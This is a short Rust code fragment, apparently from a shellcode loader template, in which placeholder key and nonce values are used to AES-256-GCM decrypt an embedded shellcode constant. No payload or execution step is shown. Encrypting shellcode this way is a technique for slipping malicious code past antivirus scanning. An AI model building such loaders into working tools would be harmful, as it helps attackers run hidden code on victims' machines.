let byte_key: [u8; 32] = [{KEY}];
        let byte_nonce: [u8; 12] = [{NONCE}];
        let key = Key::<Aes256Gcm>::from_slice(&byte_key);
        let cipher = Aes256Gcm::new(&key);
        let dec_shellcode = cipher.decrypt((&byte_nonce).into(), shellcode::SHELLCODE.as_ref()).unwrap();